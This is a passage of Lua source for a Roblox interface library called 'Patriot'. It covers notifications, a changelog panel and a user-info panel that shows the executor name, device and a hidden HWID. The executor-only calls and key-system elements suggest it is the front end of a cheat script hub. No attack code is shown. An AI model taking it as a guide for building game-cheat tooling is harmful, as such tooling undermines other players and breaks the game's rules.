            TweenService:Create(phases[i].label, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
        end
        
        TweenService:Create(blurEffect, TweenInfo.new(0.4), {Size = 0}):Play()
        task.wait(0.6)
        gui:Destroy()
        blurEffect:Destroy()
        if onComplete then onComplete() end
        completed = true
    end)

    while not completed do task.wait(0.05) end
end

local function EnsureIconsReady(callback)
    if allIconsCached() then
        loadAllIconsFromCache()
        runExternalScript()
        if callback then callback() end
    else
        ShowLoadingScreen(callback)
    end
end

function Patriot:Notify(title, message, duration, iconType)
    duration = duration or 5
    iconType = iconType or "info"
    local scale = getScale()
    local width = math.clamp(320 * scale, 260, 380)
    local height = math.clamp(80 * scale, 75, 105)

    local notifGui = Instance.new("ScreenGui")
    notifGui.ResetOnSpawn = false
    notifGui.DisplayOrder = 999999
    notifGui.Parent = hui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, width, 0, height)
    frame.Position = UDim2.new(1, width + 20, 1, -15)
    frame.AnchorPoint = Vector2.new(1, 1)
    frame.BackgroundColor3 = Patriot.Theme.CardBackground
    frame.BorderSizePixel = 0
    frame.ClipsDescendants = true
    frame.Parent = notifGui
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 6)

    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = Patriot.Theme.Accent
    stroke.Thickness = 1
    stroke.Transparency = 0.6

    local gradient = Instance.new("UIGradient", frame)
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Patriot.Theme.CardBackground),
        ColorSequenceKeypoint.new(1, Patriot.Theme.SecondaryBackground)
    })
    gradient.Rotation = 45

    local glowEffect = Instance.new("Frame")
    glowEffect.Size = UDim2.new(1, 8, 1, 8)
    glowEffect.Position = UDim2.new(0.5, 0, 0.5, 0)
    glowEffect.AnchorPoint = Vector2.new(0.5, 0.5)
    glowEffect.BackgroundTransparency = 1
    glowEffect.ZIndex = 0
    glowEffect.Parent = frame
    Instance.new("UICorner", glowEffect).CornerRadius = UDim.new(0, 8)
    
    local glowStroke = Instance.new("UIStroke", glowEffect)
    glowStroke.Color = Patriot.Theme.Accent
    glowStroke.Thickness = 2
    glowStroke.Transparency = 0.9

    local progressBg = Instance.new("Frame")
    progressBg.Size = UDim2.new(1, 0, 0, 3)
    progressBg.Position = UDim2.new(0, 0, 1, -3)
    progressBg.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
    progressBg.BorderSizePixel = 0
    progressBg.Parent = frame

    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(1, 0, 1, 0)
    progressBar.BackgroundColor3 = Patriot.Theme.Accent
    progressBar.BorderSizePixel = 0
    progressBar.Parent = progressBg
    
    local progressGradient = Instance.new("UIGradient", progressBar)
    progressGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Patriot.Theme.Accent),
        ColorSequenceKeypoint.new(1, Patriot.Theme.AccentHover)
    })

    local iconSize = height - 35
    local icon = Instance.new("ImageLabel")
    icon.Size = UDim2.new(0, iconSize, 0, iconSize)
    icon.Position = UDim2.new(0, 14, 0.5, -2)
    icon.AnchorPoint = Vector2.new(0, 0.5)
    icon.BackgroundTransparency = 1
    icon.ScaleType = Enum.ScaleType.Fit
    icon.Parent = frame

    local iconMap = {
        success = {"check", Patriot.Theme.Success}, error = {"alert", Patriot.Theme.Error},
        warning = {"alert", Patriot.Theme.Warning}, shield = {"shield", Patriot.Theme.Accent},
        info = {"shield", Patriot.Theme.Accent}, key = {"key", Patriot.Theme.Accent},
        copy = {"copy", Patriot.Theme.Success}, discord = {"discord", Patriot.Theme.Discord},
        close = {"close", Patriot.Theme.Error}
    }

    if iconMap[iconType] then
        icon.Image = getIcon(iconMap[iconType][1])
        icon.ImageColor3 = iconMap[iconType][2]
    else
        icon.Image = getLogoIcon()
        icon.ImageColor3 = Patriot.Theme.Text
    end

    local textX = 14 + iconSize + 14
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -(textX + 14), 0, 24)
    titleLabel.Position = UDim2.new(0, textX, 0, 12)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.ArimoBold
    titleLabel.TextSize = math.clamp(15 * scale, 13, 18)
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.TextColor3 = Patriot.Theme.Text
    titleLabel.Text = title
    titleLabel.TextTruncate = Enum.TextTruncate.AtEnd
    titleLabel.Parent = frame

    local messageLabel = Instance.new("TextLabel")
    messageLabel.Size = UDim2.new(1, -(textX + 14), 0, 22)
    messageLabel.Position = UDim2.new(0, textX, 0, 38)
    messageLabel.BackgroundTransparency = 1
    messageLabel.Font = Enum.Font.ArimoBold
    messageLabel.TextSize = math.clamp(13 * scale, 11, 15)
    messageLabel.TextXAlignment = Enum.TextXAlignment.Left
    messageLabel.TextColor3 = Patriot.Theme.TextDim
    messageLabel.Text = message
    messageLabel.TextTruncate = Enum.TextTruncate.AtEnd
    messageLabel.Parent = frame

    local id = tick() .. HttpService:GenerateGUID(false)
    table.insert(Internal.NotificationList, {id = id, frame = frame, gui = notifGui, height = height})

    local function restack()
        local yOffset = 0
        for i = #Internal.NotificationList, 1, -1 do
            local n = Internal.NotificationList[i]
            if n and n.frame and n.frame.Parent then
                TweenService:Create(n.frame, TweenInfo.new(0.35, Enum.EasingStyle.Quart), {Position = UDim2.new(1, -15, 1, -15 - yOffset)}):Play()
                yOffset = yOffset + n.height + 12
            end
        end
    end

    TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {Position = UDim2.new(1, -15, 1, -15)}):Play()
    TweenService:Create(glowStroke, TweenInfo.new(0.5), {Transparency = 0.9}):Play()
    task.wait(0.15)
    restack()

    local function dismiss()
        for i, n in ipairs(Internal.NotificationList) do
            if n.id == id then table.remove(Internal.NotificationList, i) break end
        end
        TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quart), {Position = UDim2.new(1, width + 20, frame.Position.Y.Scale, frame.Position.Y.Offset)}):Play()
        TweenService:Create(glowStroke, TweenInfo.new(0.3), {Transparency = 1}):Play()
        task.wait(0.4)
        notifGui:Destroy()
        restack()
    end

    TweenService:Create(progressBar, TweenInfo.new(duration, Enum.EasingStyle.Linear), {Size = UDim2.new(0, 0, 1, 0)}):Play()
    task.delay(duration, dismiss)

    local clickBtn = Instance.new("TextButton")
    clickBtn.Size = UDim2.new(1, 0, 1, 0)
    clickBtn.BackgroundTransparency = 1
    clickBtn.Text = ""
    clickBtn.Parent = frame
    clickBtn.MouseButton1Click:Connect(dismiss)
end

local function CreateChangelogPanel(parent, windowWidth, panelHeight, panelWidth, mainFrame, gap)
    panelWidth = panelWidth or 220
    local isOpen = false

    local panel = Instance.new("Frame")
    panel.Name = "ChangelogPanel"
    panel.Size = UDim2.new(0, 0, 0, panelHeight)
    panel.Position = UDim2.new(1, gap, 0, 0)
    panel.BackgroundColor3 = Patriot.Theme.CardBackground
    panel.BorderSizePixel = 0
    panel.ClipsDescendants = true
    panel.Parent = mainFrame
    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 6)

    local panelStroke = Instance.new("UIStroke", panel)
    panelStroke.Color = Patriot.Theme.Accent
    panelStroke.Thickness = 1.5
    panelStroke.Transparency = 1

    local panelGradient = Instance.new("UIGradient", panel)
    panelGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Patriot.Theme.CardBackground),
        ColorSequenceKeypoint.new(1, Patriot.Theme.Background)
    })

    local panelHeader = Instance.new("Frame")
    panelHeader.Size = UDim2.new(1, 0, 0, 50)
    panelHeader.BackgroundColor3 = Patriot.Theme.Header
    panelHeader.BorderSizePixel = 0
    panelHeader.Parent = panel
    Instance.new("UICorner", panelHeader).CornerRadius = UDim.new(0, 6)

    local panelHeaderFix = Instance.new("Frame")
    panelHeaderFix.Size = UDim2.new(1, 0, 0, 8)
    panelHeaderFix.Position = UDim2.new(0, 0, 1, -8)
    panelHeaderFix.BackgroundColor3 = Patriot.Theme.Header
    panelHeaderFix.BorderSizePixel = 0
    panelHeaderFix.Parent = panelHeader

    local panelHeaderLine = Instance.new("Frame")
    panelHeaderLine.Size = UDim2.new(1, 0, 0, 1)
    panelHeaderLine.Position = UDim2.new(0, 0, 1, 0)
    panelHeaderLine.BackgroundColor3 = Patriot.Theme.Accent
    panelHeaderLine.BackgroundTransparency = 0.4
    panelHeaderLine.BorderSizePixel = 0
    panelHeaderLine.Parent = panelHeader

    local panelHeaderIcon = Instance.new("ImageLabel")
    panelHeaderIcon.Size = UDim2.new(0, 16, 0, 16)
    panelHeaderIcon.Position = UDim2.new(0, 12, 0.5, 0)
    panelHeaderIcon.AnchorPoint = Vector2.new(0, 0.5)
    panelHeaderIcon.BackgroundTransparency = 1
    panelHeaderIcon.Image = getIcon("changelog")
    panelHeaderIcon.ImageColor3 = Patriot.Theme.Accent
    panelHeaderIcon.ScaleType = Enum.ScaleType.Fit
    panelHeaderIcon.Parent = panelHeader

    local panelTitle = Instance.new("TextLabel")
    panelTitle.Size = UDim2.new(1, -65, 1, 0)
    panelTitle.Position = UDim2.new(0, 34, 0, 0)
    panelTitle.BackgroundTransparency = 1
    panelTitle.Text = "Changelog"
    panelTitle.TextColor3 = Patriot.Theme.Text
    panelTitle.TextSize = 16
    panelTitle.Font = Enum.Font.ArimoBold
    panelTitle.TextXAlignment = Enum.TextXAlignment.Left
    panelTitle.Parent = panelHeader

    local panelClose = Instance.new("ImageButton")
    panelClose.Size = UDim2.new(0, 20, 0, 20)
    panelClose.Position = UDim2.new(1, -14, 0.5, 0)
    panelClose.AnchorPoint = Vector2.new(1, 0.5)
    panelClose.BackgroundTransparency = 1
    panelClose.Image = getIcon("close")
    panelClose.ImageColor3 = Patriot.Theme.TextDim
    panelClose.ScaleType = Enum.ScaleType.Fit
    panelClose.Parent = panelHeader
    panelClose.MouseEnter:Connect(function() TweenService:Create(panelClose, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.Error}):Play() end)
    panelClose.MouseLeave:Connect(function() TweenService:Create(panelClose, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.TextDim}):Play() end)

    local scrollFrame = Instance.new("ScrollingFrame")
    scrollFrame.Size = UDim2.new(1, 0, 1, -55)
    scrollFrame.Position = UDim2.new(0, 0, 0, 55)
    scrollFrame.BackgroundTransparency = 1
    scrollFrame.BorderSizePixel = 0
    scrollFrame.ScrollBarThickness = 3
    scrollFrame.ScrollBarImageColor3 = Patriot.Theme.Accent
    scrollFrame.ScrollBarImageTransparency = 0.5
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
    scrollFrame.Parent = panel

    local scrollPadding = Instance.new("UIPadding", scrollFrame)
    scrollPadding.PaddingLeft = UDim.new(0, 10)
    scrollPadding.PaddingRight = UDim.new(0, 10)
    scrollPadding.PaddingTop = UDim.new(0, 8)
    scrollPadding.PaddingBottom = UDim.new(0, 8)

    local contentLayout = Instance.new("UIListLayout", scrollFrame)
    contentLayout.Padding = UDim.new(0, 12)
    contentLayout.SortOrder = Enum.SortOrder.LayoutOrder

    for i, update in ipairs(Patriot.Changelog) do
        local entry = Instance.new("Frame")
        entry.Size = UDim2.new(1, 0, 0, 0)
        entry.AutomaticSize = Enum.AutomaticSize.Y
        entry.BackgroundTransparency = 1
        entry.LayoutOrder = i * 2
        entry.Parent = scrollFrame

        local entryLayout = Instance.new("UIListLayout", entry)
        entryLayout.Padding = UDim.new(0, 6)

        local versionLabel = Instance.new("TextLabel")
        versionLabel.Size = UDim2.new(1, 0, 0, 22)
        versionLabel.BackgroundTransparency = 1
        versionLabel.Text = update.Version .. "  â€¢  " .. update.Date
        versionLabel.TextColor3 = Patriot.Theme.Accent
        versionLabel.TextSize = 14
        versionLabel.Font = Enum.Font.ArimoBold
        versionLabel.TextXAlignment = Enum.TextXAlignment.Left
        versionLabel.LayoutOrder = 1
        versionLabel.Parent = entry

        for j, change in ipairs(update.Changes) do
            local changeLabel = Instance.new("TextLabel")
            changeLabel.Size = UDim2.new(1, 0, 0, 0)
            changeLabel.AutomaticSize = Enum.AutomaticSize.Y
            changeLabel.BackgroundTransparency = 1
            changeLabel.Text = "  â€¢  " .. change
            changeLabel.TextColor3 = Patriot.Theme.TextDim
            changeLabel.TextSize = 12
            changeLabel.Font = Enum.Font.ArimoBold
            changeLabel.TextXAlignment = Enum.TextXAlignment.Left
            changeLabel.TextWrapped = true
            changeLabel.LayoutOrder = j + 1
            changeLabel.Parent = entry
        end

        if i < #Patriot.Changelog then
            local divWrapper = Instance.new("Frame")
            divWrapper.Size = UDim2.new(1, 0, 0, 3)
            divWrapper.BackgroundTransparency = 1
            divWrapper.LayoutOrder = i * 2 + 1
            divWrapper.Parent = scrollFrame

            local div = Instance.new("Frame")
            div.Size = UDim2.new(1, 0, 0, 1)
            div.BackgroundColor3 = Patriot.Theme.Divider
            div.BorderSizePixel = 0
            div.Parent = divWrapper
        end
    end

    local function toggle(changelogIcon, container, currentContainerWidth)
        isOpen = not isOpen
        if isOpen then
            TweenService:Create(panelStroke, TweenInfo.new(0.25), {Transparency = 0.3}):Play()
            TweenService:Create(panel, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, panelWidth, 0, panelHeight)}):Play()
            TweenService:Create(container, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, currentContainerWidth + gap + panelWidth, 0, panelHeight)}):Play()
            if changelogIcon then TweenService:Create(changelogIcon, TweenInfo.new(0.35, Enum.EasingStyle.Back), {Rotation = 180}):Play() end
        else
            TweenService:Create(panelStroke, TweenInfo.new(0.2), {Transparency = 1}):Play()
            TweenService:Create(panel, TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, panelHeight)}):Play()
            TweenService:Create(container, TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, currentContainerWidth, 0, panelHeight)}):Play()
            if changelogIcon then TweenService:Create(changelogIcon, TweenInfo.new(0.35, Enum.EasingStyle.Back), {Rotation = 0}):Play() end
        end
    end

    panelClose.MouseButton1Click:Connect(function() if isOpen then toggle(nil, parent, windowWidth) end end)
    return panel, toggle, function() return isOpen end, panelWidth
end

local function CreateUserInfoPanel(parent, windowWidth, panelHeight, panelWidth, mainFrame, gap, startOpen)
    panelWidth = panelWidth or 180
    local isOpen = startOpen or false
    local isCompact = panelHeight < 300
    local avatarSize = isCompact and 42 or 55
    local fieldHeight = isCompact and 24 or 28
    local titleSize = isCompact and 8 or 9
    local valueSize = isCompact and 10 or 11
    local welcomeSize = isCompact and 11 or 12
    local spacing = isCompact and 3 or 5

    local panel = Instance.new("Frame")
    panel.Name = "UserInfoPanel"
    panel.Size = UDim2.new(0, isOpen and panelWidth or 0, 0, panelHeight)
    panel.Position = UDim2.new(0, -(gap), 0, 0)
    panel.AnchorPoint = Vector2.new(1, 0)
    panel.BackgroundColor3 = Patriot.Theme.CardBackground
    panel.BorderSizePixel = 0
    panel.ClipsDescendants = true
    panel.Parent = mainFrame
    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 6)

    local panelStroke = Instance.new("UIStroke", panel)
    panelStroke.Color = Patriot.Theme.Accent
    panelStroke.Thickness = 1.5
    panelStroke.Transparency = isOpen and 0.3 or 1

    local panelGradient = Instance.new("UIGradient", panel)
    panelGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Patriot.Theme.CardBackground),
        ColorSequenceKeypoint.new(1, Patriot.Theme.Background)
    })

    local panelHeader = Instance.new("Frame")
    panelHeader.Size = UDim2.new(1, 0, 0, 50)
    panelHeader.BackgroundColor3 = Patriot.Theme.Header
    panelHeader.BorderSizePixel = 0
    panelHeader.Parent = panel
    Instance.new("UICorner", panelHeader).CornerRadius = UDim.new(0, 6)

    local panelHeaderFix = Instance.new("Frame")
    panelHeaderFix.Size = UDim2.new(1, 0, 0, 8)
    panelHeaderFix.Position = UDim2.new(0, 0, 1, -8)
    panelHeaderFix.BackgroundColor3 = Patriot.Theme.Header
    panelHeaderFix.BorderSizePixel = 0
    panelHeaderFix.Parent = panelHeader

    local panelHeaderLine = Instance.new("Frame")
    panelHeaderLine.Size = UDim2.new(1, 0, 0, 1)
    panelHeaderLine.Position = UDim2.new(0, 0, 1, 0)
    panelHeaderLine.BackgroundColor3 = Patriot.Theme.Accent
    panelHeaderLine.BackgroundTransparency = 0.4
    panelHeaderLine.BorderSizePixel = 0
    panelHeaderLine.Parent = panelHeader

    local panelHeaderIcon = Instance.new("ImageLabel")
    panelHeaderIcon.Size = UDim2.new(0, 16, 0, 16)
    panelHeaderIcon.Position = UDim2.new(0, 12, 0.5, 0)
    panelHeaderIcon.AnchorPoint = Vector2.new(0, 0.5)
    panelHeaderIcon.BackgroundTransparency = 1
    panelHeaderIcon.Image = getIcon("user")
    panelHeaderIcon.ImageColor3 = Patriot.Theme.Accent
    panelHeaderIcon.ScaleType = Enum.ScaleType.Fit
    panelHeaderIcon.Parent = panelHeader

    local panelTitle = Instance.new("TextLabel")
    panelTitle.Size = UDim2.new(1, -65, 1, 0)
    panelTitle.Position = UDim2.new(0, 34, 0, 0)
    panelTitle.BackgroundTransparency = 1
    panelTitle.Text = "User Info"
    panelTitle.TextColor3 = Patriot.Theme.Text
    panelTitle.TextSize = 16
    panelTitle.Font = Enum.Font.ArimoBold
    panelTitle.TextXAlignment = Enum.TextXAlignment.Left
    panelTitle.Parent = panelHeader

    local panelClose = Instance.new("ImageButton")
    panelClose.Size = UDim2.new(0, 20, 0, 20)
    panelClose.Position = UDim2.new(1, -14, 0.5, 0)
    panelClose.AnchorPoint = Vector2.new(1, 0.5)
    panelClose.BackgroundTransparency = 1
    panelClose.Image = getIcon("close")
    panelClose.ImageColor3 = Patriot.Theme.TextDim
    panelClose.ScaleType = Enum.ScaleType.Fit
    panelClose.Parent = panelHeader
    panelClose.MouseEnter:Connect(function() TweenService:Create(panelClose, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.Error}):Play() end)
    panelClose.MouseLeave:Connect(function() TweenService:Create(panelClose, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.TextDim}):Play() end)

    local contentFrame = Instance.new("Frame")
    contentFrame.Size = UDim2.new(1, 0, 1, -55)
    contentFrame.Position = UDim2.new(0, 0, 0, 55)
    contentFrame.BackgroundTransparency = 1
    contentFrame.Parent = panel

    local contentPadding = Instance.new("UIPadding", contentFrame)
    contentPadding.PaddingLeft = UDim.new(0, 8)
    contentPadding.PaddingRight = UDim.new(0, 8)

    local contentLayout = Instance.new("UIListLayout", contentFrame)
    contentLayout.Padding = UDim.new(0, spacing)
    contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
    contentLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    contentLayout.VerticalAlignment = Enum.VerticalAlignment.Center

    local player = cloneref(Players.LocalPlayer)

    local avatarWrapper = Instance.new("Frame")
    avatarWrapper.Size = UDim2.new(0, avatarSize + 6, 0, avatarSize + 6)
    avatarWrapper.BackgroundTransparency = 1
    avatarWrapper.LayoutOrder = 1
    avatarWrapper.Parent = contentFrame

    local avatarGlow = Instance.new("Frame")
    avatarGlow.Size = UDim2.new(1, 0, 1, 0)
    avatarGlow.Position = UDim2.new(0.5, 0, 0.5, 0)
    avatarGlow.AnchorPoint = Vector2.new(0.5, 0.5)
    avatarGlow.BackgroundColor3 = Patriot.Theme.Accent
    avatarGlow.BackgroundTransparency = 0.4
    avatarGlow.BorderSizePixel = 0
    avatarGlow.Parent = avatarWrapper
    Instance.new("UICorner", avatarGlow).CornerRadius = UDim.new(0, 4)

    local avatarGlowStroke = Instance.new("UIStroke", avatarGlow)
    avatarGlowStroke.Color = Patriot.Theme.Accent
    avatarGlowStroke.Thickness = 1.5
    avatarGlowStroke.Transparency = 0.2

    local avatarContainer = Instance.new("Frame")
    avatarContainer.Size = UDim2.new(0, avatarSize, 0, avatarSize)
    avatarContainer.Position = UDim2.new(0.5, 0, 0.5, 0)
    avatarContainer.AnchorPoint = Vector2.new(0.5, 0.5)
    avatarContainer.BackgroundColor3 = Patriot.Theme.Input
    avatarContainer.BorderSizePixel = 0
    avatarContainer.ClipsDescendants = true
    avatarContainer.Parent = avatarWrapper
    Instance.new("UICorner", avatarContainer).CornerRadius = UDim.new(0, 4)

    local avatarImage = Instance.new("ImageLabel")
    avatarImage.Size = UDim2.new(1, 0, 1, 0)
    avatarImage.Position = UDim2.new(0.5, 0, 0.5, 0)
    avatarImage.AnchorPoint = Vector2.new(0.5, 0.5)
    avatarImage.BackgroundTransparency = 1
    avatarImage.ScaleType = Enum.ScaleType.Crop
    avatarImage.Parent = avatarContainer
    pcall(function()
        local content = Players:GetUserThumbnailAsync(player and player.UserId or 0, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
        avatarImage.Image = content
    end)

    local welcomeLabel = Instance.new("TextLabel")
    welcomeLabel.Size = UDim2.new(1, 0, 0, isCompact and 14 or 18)
    welcomeLabel.BackgroundTransparency = 1
    welcomeLabel.Text = "Welcome, " .. (player and player.DisplayName or "User")
    welcomeLabel.TextColor3 = Patriot.Theme.Text
    welcomeLabel.TextSize = welcomeSize
    welcomeLabel.Font = Enum.Font.ArimoBold
    welcomeLabel.TextTruncate = Enum.TextTruncate.AtEnd
    welcomeLabel.LayoutOrder = 2
    welcomeLabel.Parent = contentFrame

    local divider1 = Instance.new("Frame")
    divider1.Size = UDim2.new(1, 16, 0, 1)
    divider1.Position = UDim2.new(0.5, 0, 0, 0)
    divider1.AnchorPoint = Vector2.new(0.5, 0)
    divider1.BackgroundColor3 = Patriot.Theme.Divider
    divider1.BorderSizePixel = 0
    divider1.LayoutOrder = 3
    divider1.Parent = contentFrame

    local executorContainer = Instance.new("Frame")
    executorContainer.Size = UDim2.new(1, 0, 0, fieldHeight)
    executorContainer.BackgroundTransparency = 1
    executorContainer.LayoutOrder = 4
    executorContainer.Parent = contentFrame

    local executorTitle = Instance.new("TextLabel")
    executorTitle.Size = UDim2.new(1, 0, 0, 11)
    executorTitle.BackgroundTransparency = 1
    executorTitle.Text = "Executor"
    executorTitle.TextColor3 = Patriot.Theme.TextDim
    executorTitle.TextSize = titleSize
    executorTitle.Font = Enum.Font.ArimoBold
    executorTitle.TextXAlignment = Enum.TextXAlignment.Left
    executorTitle.Parent = executorContainer

    local executorValue = Instance.new("TextLabel")
    executorValue.Size = UDim2.new(1, 0, 0, 14)
    executorValue.Position = UDim2.new(0, 0, 0, 11)
    executorValue.BackgroundTransparency = 1
    executorValue.Text = getExecutorName()
    executorValue.TextColor3 = Patriot.Theme.Accent
    executorValue.TextSize = valueSize
    executorValue.Font = Enum.Font.ArimoBold
    executorValue.TextXAlignment = Enum.TextXAlignment.Left
    executorValue.TextTruncate = Enum.TextTruncate.AtEnd
    executorValue.Parent = executorContainer

    local deviceContainer = Instance.new("Frame")
    deviceContainer.Size = UDim2.new(1, 0, 0, fieldHeight)
    deviceContainer.BackgroundTransparency = 1
    deviceContainer.LayoutOrder = 5
    deviceContainer.Parent = contentFrame

    local deviceTitle = Instance.new("TextLabel")
    deviceTitle.Size = UDim2.new(1, 0, 0, 11)
    deviceTitle.BackgroundTransparency = 1
    deviceTitle.Text = "Device"
    deviceTitle.TextColor3 = Patriot.Theme.TextDim
    deviceTitle.TextSize = titleSize
    deviceTitle.Font = Enum.Font.ArimoBold
    deviceTitle.TextXAlignment = Enum.TextXAlignment.Left
    deviceTitle.Parent = deviceContainer

    local deviceValue = Instance.new("TextLabel")
    deviceValue.Size = UDim2.new(1, 0, 0, 14)
    deviceValue.Position = UDim2.new(0, 0, 0, 11)
    deviceValue.BackgroundTransparency = 1
    deviceValue.Text = getDeviceType()
    deviceValue.TextColor3 = Patriot.Theme.Accent
    deviceValue.TextSize = valueSize
    deviceValue.Font = Enum.Font.ArimoBold
    deviceValue.TextXAlignment = Enum.TextXAlignment.Left
    deviceValue.TextTruncate = Enum.TextTruncate.AtEnd
    deviceValue.Parent = deviceContainer

    local divider2 = Instance.new("Frame")
    divider2.Size = UDim2.new(1, 16, 0, 1)
    divider2.Position = UDim2.new(0.5, 0, 0, 0)
    divider2.AnchorPoint = Vector2.new(0.5, 0)
    divider2.BackgroundColor3 = Patriot.Theme.Divider
    divider2.BorderSizePixel = 0
    divider2.LayoutOrder = 6
    divider2.Parent = contentFrame

    local hwidContainer = Instance.new("Frame")
    hwidContainer.Size = UDim2.new(1, 0, 0, fieldHeight)
    hwidContainer.BackgroundTransparency = 1
    hwidContainer.LayoutOrder = 7
    hwidContainer.Parent = contentFrame

    local hwidTitle = Instance.new("TextLabel")
    hwidTitle.Size = UDim2.new(1, 0, 0, 11)
    hwidTitle.BackgroundTransparency = 1
    hwidTitle.Text = "HWID"
    hwidTitle.TextColor3 = Patriot.Theme.TextDim
    hwidTitle.TextSize = titleSize
    hwidTitle.Font = Enum.Font.ArimoBold
    hwidTitle.TextXAlignment = Enum.TextXAlignment.Left
    hwidTitle.Parent = hwidContainer

    local fullHWID = getHWID()
    local copyBtnSize = 18
    local dotAreaWidth = panelWidth - 16 - copyBtnSize - 6
    local hiddenDots = generateHiddenDots(dotAreaWidth, 5)

    local hwidValue = Instance.new("TextLabel")
    hwidValue.Size = UDim2.new(1, -(copyBtnSize + 6), 0, 14)
    hwidValue.Position = UDim2.new(0, 0, 0, 11)
    hwidValue.BackgroundTransparency = 1
    hwidValue.Text = hiddenDots
    hwidValue.TextColor3 = Patriot.Theme.TextDim
    hwidValue.TextSize = isCompact and 9 or 10
    hwidValue.Font = Enum.Font.ArimoBold
    hwidValue.TextXAlignment = Enum.TextXAlignment.Left
    hwidValue.TextTruncate = Enum.TextTruncate.AtEnd
    hwidValue.Parent = hwidContainer

    local copyBtn = Instance.new("ImageButton")
    copyBtn.Size = UDim2.new(0, copyBtnSize, 0, copyBtnSize)
    copyBtn.Position = UDim2.new(1, 0, 0.5, 1)
    copyBtn.AnchorPoint = Vector2.new(1, 0.5)
    copyBtn.BackgroundTransparency = 1
    copyBtn.Image = getIcon("copy")
    copyBtn.ImageColor3 = Patriot.Theme.TextDim
    copyBtn.ScaleType = Enum.ScaleType.Fit
    copyBtn.Parent = hwidContainer
    copyBtn.MouseEnter:Connect(function() TweenService:Create(copyBtn, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.Accent}):Play() end)
    copyBtn.MouseLeave:Connect(function() TweenService:Create(copyBtn, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.TextDim}):Play() end)
    copyBtn.MouseButton1Click:Connect(function()
        pcall(function() setclipboard(fullHWID) end)
        TweenService:Create(copyBtn, TweenInfo.new(0.1), {ImageColor3 = Patriot.Theme.Success}):Play()
        task.delay(0.3, function() TweenService:Create(copyBtn, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.TextDim}):Play() end)
        Patriot:Notify("Copied", "HWID copied to clipboard", 2, "copy")
    end)

    local divider3 = Instance.new("Frame")
    divider3.Size = UDim2.new(1, 16, 0, 1)
    divider3.Position = UDim2.new(0.5, 0, 0, 0)
    divider3.AnchorPoint = Vector2.new(0.5, 0)
    divider3.BackgroundColor3 = Patriot.Theme.Divider
    divider3.BorderSizePixel = 0
    divider3.LayoutOrder = 8
    divider3.Parent = contentFrame

    local clockContainer = Instance.new("Frame")
    clockContainer.Size = UDim2.new(1, 0, 0, isCompact and 30 or 38)
    clockContainer.BackgroundTransparency = 1
    clockContainer.LayoutOrder = 9
    clockContainer.Parent = contentFrame

    local clockRow = Instance.new("Frame")
    clockRow.Size = UDim2.new(1, 0, 0, isCompact and 18 or 22)
    clockRow.Position = UDim2.new(0.5, -8, 0, 0)
    clockRow.AnchorPoint = Vector2.new(0.5, 0)
    clockRow.BackgroundTransparency = 1
    clockRow.Parent = clockContainer

    local clockRowLayout = Instance.new("UIListLayout", clockRow)
    clockRowLayout.FillDirection = Enum.FillDirection.Horizontal
    clockRowLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    clockRowLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    clockRowLayout.Padding = UDim.new(0, isCompact and 4 or 6)

    local clockIcon = Instance.new("ImageLabel")
    clockIcon.Size = UDim2.new(0, isCompact and 14 or 16, 0, isCompact and 14 or 16)
    clockIcon.BackgroundTransparency = 1
    clockIcon.Image = getIcon("clock")
    clockIcon.ImageColor3 = Patriot.Theme.Accent
    clockIcon.ScaleType = Enum.ScaleType.Fit
    clockIcon.LayoutOrder = 1
    clockIcon.Parent = clockRow

    local clockTimeLabel = Instance.new("TextLabel")
    clockTimeLabel.Size = UDim2.new(0, 0, 1, 0)
    clockTimeLabel.AutomaticSize = Enum.AutomaticSize.X
    clockTimeLabel.BackgroundTransparency = 1
    clockTimeLabel.Text = formatTime12()
    clockTimeLabel.TextColor3 = Patriot.Theme.Accent
    clockTimeLabel.TextSize = isCompact and 14 or 16
    clockTimeLabel.Font = Enum.Font.ArimoBold
    clockTimeLabel.LayoutOrder = 2
    clockTimeLabel.Parent = clockRow

    local clockDateLabel = Instance.new("TextLabel")
    clockDateLabel.Size = UDim2.new(1, 0, 0, isCompact and 12 or 14)
    clockDateLabel.Position = UDim2.new(0, -8, 0, isCompact and 18 or 22)
    clockDateLabel.BackgroundTransparency = 1
    clockDateLabel.Text = formatDate()
    clockDateLabel.TextColor3 = Patriot.Theme.TextDim
    clockDateLabel.TextSize = isCompact and 9 or 11
    clockDateLabel.Font = Enum.Font.ArimoBold
    clockDateLabel.TextXAlignment = Enum.TextXAlignment.Center
